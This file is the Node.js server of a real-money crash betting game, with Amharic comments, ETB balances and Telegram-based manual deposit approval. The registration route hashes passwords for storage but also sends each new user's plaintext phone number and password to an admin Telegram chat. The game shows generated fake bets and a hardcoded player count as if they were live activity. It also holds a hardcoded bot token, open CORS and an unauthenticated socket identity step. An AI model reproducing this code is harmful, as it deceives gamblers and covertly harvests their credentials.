const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const bcrypt = require('bcryptjs');

const app = express();

// 1. CORS Configuration
app.use(cors({
    origin: "*",
    methods: ["GET", "POST"]
}));
app.use(express.json({ limit: '15mb' })); 

const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// --- Configuration (ቴሌግራም) ---
const TELEGRAM_TOKEN = '8601691945:AAHuf1tKpCAmU6j6cOqp0i8sR0qv4F0nCPc';
const ADMIN_CHAT_ID = '2068983666';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

bot.on('polling_error', (error) => {});

// --- የግንኙነት መቆጣጠሪያ ---
let userSockets = {}; 
let temporaryUsers = {}; // ለጊዜው በMemory ዳታ ለመያዝ

// --- የጌም ሁኔታ (Game State) ---
let gameState = {
    multiplier: 1.0,
    status: 'waiting',
    timer: 10,
    userCount: 2500,
    liveBets: [],
    gameHistory: []
};

// --- የውሸት ውርርዶች መፍጠሪያ ---
const generateFakeBets = () => {
    const fakeNames = ["Abebe", "Sara", "Yoni", "Mery", "Ethio", "King", "Lucky", "Dave", "Kal", "Bini", "Tedi", "Hani", "Mahi", "Lili"];
    let bets = Array.from({ length: 30 }, () => {
        const name = fakeNames[Math.floor(Math.random() * fakeNames.length)] + "***" + Math.floor(Math.random() * 99);
        const amount = (Math.floor(Math.random() * 100) + 1) * 10; 
        return { 
            user: name, 
            amount, 
            time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) 
        };
    });
    return bets.sort((a, b) => b.amount - a.amount);
};

// --- Authentication Routes ---
app.post('/register', async (req, res) => {
    const { phone, password } = req.body;
    const hashedPassword = await bcrypt.hash(password, 10);
    temporaryUsers[phone] = { phone, password: hashedPassword, balance: 0 };

    const msg = `👤 *አዲስ ተመዝጋቢ*\n\n📱 ስልክ: \`${phone}\` \n🔑 Password: \`${password}\` \n🕒 ጊዜ: ${new Date().toLocaleString()}`;
    bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' }).catch(e => {});

    res.json({ status: 'ok' });
});

app.post('/login', async (req, res) => {
    const { phone, password } = req.body;
    const user = temporaryUsers[phone];
    if (!user) return res.json({ status: 'error', error: 'ተጠቃሚው አልተገኘም' });

    const isMatch = await bcrypt.compare(password, user.password);
    if (isMatch) {
        res.json({ status: 'ok', balance: user.balance, phone: user.phone });
    } else {
        res.json({ status: 'error', error: 'የይለፍ ቃል ተሳስቷል' });
    }
});

// --- Telegram Approve/Reject Logic ---
bot.on('callback_query', (query) => {
    const [action, phone, amount] = query.data.split('_');
    const user = temporaryUsers[phone];

    if (action === 'approve' && user) {
        user.balance += parseFloat(amount);
        bot.sendMessage(ADMIN_CHAT_ID, `✅ የ ${phone} ዲፖዚት ጸድቋል። አዲስ ባላንስ: ${user.balance} ETB`);
        if (userSockets[phone]) {
            io.to(userSockets[phone]).emit('balanceUpdate', user.balance);
        }
    } else if (action === 'reject') {
        bot.sendMessage(ADMIN_CHAT_ID, `❌ የ ${phone} ጥያቄ ተሰርዟል።`);
    }
    bot.answerCallbackQuery(query.id);
});

// --- Socket Communication ---
io.on('connection', (socket) => {
    socket.emit('data', gameState);

    socket.on('identify', (phone) => {
        userSockets[phone] = socket.id;
    });

    socket.on('sendDepositRequest', (data) => {
        const msg = `💰 *የዲፖዚት ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*`;
        const opts = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve', callback_data: `approve_${data.phone}_${data.amount}` },
                    { text: '❌ Reject', callback_data: `reject_${data.phone}_${data.amount}` }
                ]]
            }
        };
        bot.sendMessage(ADMIN_CHAT_ID, msg, opts);
    });

    socket.on('sendWithdrawRequest', (data) => {
        const user = temporaryUsers[data.phone];
        if (user && user.balance >= data.amount) {
            user.balance -= parseFloat(data.amount);
            const msg = `📤 *የውዝድሮው ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*`;
            bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' });
            socket.emit('balanceUpdate', user.balance);
        }
    });

    socket.on('disconnect', () => {
        for (let phone in userSockets) {
            if (userSockets[phone] === socket.id) delete userSockets[phone];
        }
    });
});

// --- Game Engine Logic ---
const startGame = () => {
    gameState.status = 'waiting';
    gameState.timer = 10;
    gameState.multiplier = 1.0;
    gameState.liveBets = generateFakeBets();
    
    const countdown = setInterval(() => {
        gameState.timer--;
        io.emit('data', gameState);
        if (gameState.timer <= 0) {
            clearInterval(countdown);
            startFlying();
        }
    }, 1000);
};

const startFlying = () => {
    gameState.status = 'flying';
    const crashPoint = Math.random() < 0.1 ? 1.0 : parseFloat((1 / (1 - Math.random() * 0.95)).toFixed(2));
    
    const interval = setInterval(() => {
        if (gameState.multiplier < crashPoint) {
            gameState.multiplier = parseFloat((gameState.multiplier + 0.01).toFixed(2));
            io.emit('data', gameState);
        } else {
            clearInterval(interval);
            gameState.status = 'crashed';
            gameState.gameHistory.unshift(gameState.multiplier);
            if (gameState.gameHistory.length > 12) gameState.gameHistory.pop();
            io.emit('data', gameState);
            setTimeout(startGame, 3000);
        }
    }, 100);
};

// 2. Port Configuration
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`✅ ሰርቨሩ በፖርት ${PORT} ላይ ስራ ጀምሯል`);
    startGame();
});